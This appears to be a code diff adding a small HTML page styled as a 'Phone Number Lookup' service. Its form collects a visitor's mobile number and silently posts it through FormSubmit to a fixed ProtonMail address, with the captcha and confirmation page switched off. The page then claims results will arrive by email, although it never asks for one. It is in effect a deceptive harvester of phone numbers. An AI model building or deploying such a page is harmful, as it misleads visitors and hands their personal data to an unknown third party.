@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phone Number Lookup</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    input[type="submit"] {
+      background-color: #007BFF;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .message {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <form action="https://formsubmit.co/thesecrec@proton.me" method="POST" onsubmit="showMessage()">
+    <h2>Enter Mobile Number</h2>
+    <input type="text" name="phone_number" placeholder="Enter mobile number" required />
+    
+    <!-- To skip FormSubmit’s confirmation page -->
+    <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html" />
+    <input type="hidden" name="_captcha" value="false">
+
+    <input type="submit" value="Submit" />
+    <p class="message" id="thanksMessage">Thanks for giving inputs. Results will come to your mail ID instantly.</p>
+  </form>
+
+  <script>
+    function showMessage() {
+      document.getElementById("thanksMessage").style.display = "block";
+    }
+  </script>
+</body>
+</html>
